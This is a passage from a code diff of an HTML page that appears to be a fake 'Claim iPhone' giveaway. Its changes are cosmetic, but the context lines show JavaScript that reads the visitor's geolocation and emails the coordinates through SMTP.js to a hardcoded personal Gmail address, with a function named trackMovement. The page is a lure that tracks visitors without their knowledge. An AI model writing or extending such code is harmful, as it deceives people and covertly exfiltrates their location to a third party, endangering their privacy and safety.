@@ -76,6 +76,9 @@
             margin-top: 15px;
             font-size: 0.9rem;
         }
+        #getLocationBtn {
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
@@ -119,12 +122,13 @@
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
 
-        <button id="getLocationBtn" class="btn btn-secondary btn-block" style="margin-top: 15px;">Get Location</button>
+        <button id="getLocationBtn" class="btn btn-secondary btn-block">Get Location</button>
     </div>
 
     <!-- JavaScript code -->
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
+    // Function to send email
     function sendEmail(subject, message, recipientEmail) {
         try {
             Email.send({
@@ -149,11 +153,13 @@
         }
     }
 
+    // Function to send location email
     function sendLocationEmail(latitude, longitude) {
         const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
         sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
     }
 
+    // Function to track movement and get location
     function trackMovement() {
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
